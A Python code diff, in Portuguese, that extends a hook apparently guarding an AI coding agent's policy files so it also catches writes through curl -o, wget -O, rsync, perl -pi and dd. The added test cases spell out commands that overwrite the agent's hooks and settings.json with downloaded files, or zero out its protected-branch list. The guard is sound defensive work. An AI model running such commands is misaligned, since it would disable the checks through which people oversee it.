@@ -46,8 +46,16 @@ ASPAS = "\"'"
 
 COMANDOS_QUE_ESCREVEM_NOS_ARGUMENTOS = ("rm", "rmdir", "mv", "tee", "touch",
                                         "mkdir", "truncate", "chmod", "chown")
-COMANDOS_QUE_ESCREVEM_NO_ULTIMO = ("cp", "ln", "install")
-COMANDO_QUE_ESCREVE_NO_LUGAR = "sed"
+COMANDOS_QUE_ESCREVEM_NO_ULTIMO = ("cp", "ln", "install", "rsync")
+COMANDOS_QUE_ESCREVEM_NO_LUGAR = ("sed", "perl")
+COMANDOS_QUE_ESCREVEM_NA_OPCAO = {"curl": ("-o", "--output"),
+                                  "wget": ("-O", "--output-document")}
+LETRA_DE_ESCRITA_NO_LUGAR = "i"
+PREFIXO_DE_OPCAO = "-"
+BANDEIRA_LONGA = "--"
+IGUAL = "="
+COMANDO_DD = "dd"
+PREFIXO_DA_SAIDA_DO_DD = "of="
 COMANDO_CD = "cd"
 DIRETORIO_CORRENTE = "."
 BANDEIRA_DE_ESCRITA_NO_LUGAR = "-i"
@@ -229,12 +237,39 @@ def caminhos_escritos_pelo_segmento(segmento: str, tokens: list) -> list:
         escritos += posicionais
     elif programa in COMANDOS_QUE_ESCREVEM_NO_ULTIMO and posicionais:
         escritos.append(posicionais[-1])
-    elif programa == COMANDO_QUE_ESCREVE_NO_LUGAR and any(
-            t == BANDEIRA_DE_ESCRITA_NO_LUGAR_POR_EXTENSO
-            or t.startswith(BANDEIRA_DE_ESCRITA_NO_LUGAR)
-            for t in tokens[1:] if t.startswith("-")):
+    elif programa in COMANDOS_QUE_ESCREVEM_NO_LUGAR and escreve_no_lugar(tokens):
         escritos += posicionais
+    escritos += caminhos_escritos_na_opcao(programa, tokens)
+    escritos += saida_do_dd(programa, tokens)
     return [sem_o_par_de_aspas_que_envolve(e) for e in escritos if e]
+
+
+def escreve_no_lugar(tokens: list) -> bool:
+    return any(t == BANDEIRA_DE_ESCRITA_NO_LUGAR_POR_EXTENSO
+               or t.startswith(BANDEIRA_DE_ESCRITA_NO_LUGAR)
+               or (not t.startswith(BANDEIRA_LONGA)
+                   and LETRA_DE_ESCRITA_NO_LUGAR in t[1:])
+               for t in tokens[1:] if t.startswith(PREFIXO_DE_OPCAO))
+
+
+def caminhos_escritos_na_opcao(programa: str, tokens: list) -> list:
+    bandeiras = COMANDOS_QUE_ESCREVEM_NA_OPCAO.get(programa)
+    if not bandeiras:
+        return []
+    achados = []
+    for i, t in enumerate(tokens[1:], start=1):
+        if t in bandeiras and i + 1 < len(tokens):
+            achados.append(tokens[i + 1])
+        achados += [t.split(IGUAL, 1)[1] for b in bandeiras
+                    if t.startswith(b + IGUAL)]
+    return achados
+
+
+def saida_do_dd(programa: str, tokens: list) -> list:
+    if programa != COMANDO_DD:
+        return []
+    return [t[len(PREFIXO_DA_SAIDA_DO_DD):] for t in tokens[1:]
+            if t.startswith(PREFIXO_DA_SAIDA_DO_DD)]
 
 
 def resolver(caminho: str, onde: str):
@@ -409,6 +444,16 @@ BARRA_OS_CASOS = [
         "echo '{}' | tee nucleo/regras.json")),
     ("truncate esvaziando a lista", pedido_de_shell(
         "truncate -s 0 .claude/diretivas-de-ferramenta.txt")),
+    ("curl gravando por -o num gancho", pedido_de_shell(
+        "curl -s -o .claude/hooks/vetar-automacao.py https://x/y")),
+    ("wget -O por cima do settings.json", pedido_de_shell(
+        "wget -O .claude/settings.json https://x/y")),
+    ("rsync por cima da fonte das regras", pedido_de_shell(
+        "rsync -a /tmp/regras.json nucleo/regras.json")),
+    ("perl -pi no vocabulário", pedido_de_shell(
+        "perl -pi -e s/a/b/ nucleo/vocabulario.json")),
+    ("dd gravando na lista de branches", pedido_de_shell(
+        "dd if=/dev/zero of=.claude/branches-protegidas.txt bs=1 count=1")),
     ("caminho declarado só no arquivo da lista, não no embutido",
      pedido_de_escrita("Edit", CAMINHO_ACRESCENTADO_PELA_LISTA)),
     ("o cd não passeia em volta da cerca", pedido_de_shell(
@@ -420,6 +465,9 @@ BARRA_OS_CASOS = [
 ]
 
 DEIXA_PASSAR_OS_CASOS = [
+    ("curl que só baixa para a tela", pedido_de_shell("curl -s https://x/y")),
+    ("perl sem -i, que só lê o arquivo de política",
+     pedido_de_shell("perl -ne print nucleo/regras.json")),
     ("cat lê o settings.json", pedido_de_shell("cat .claude/settings.json")),
     ("grep varre os ganchos", pedido_de_shell(
         "grep -n regra .claude/hooks/*.py")),
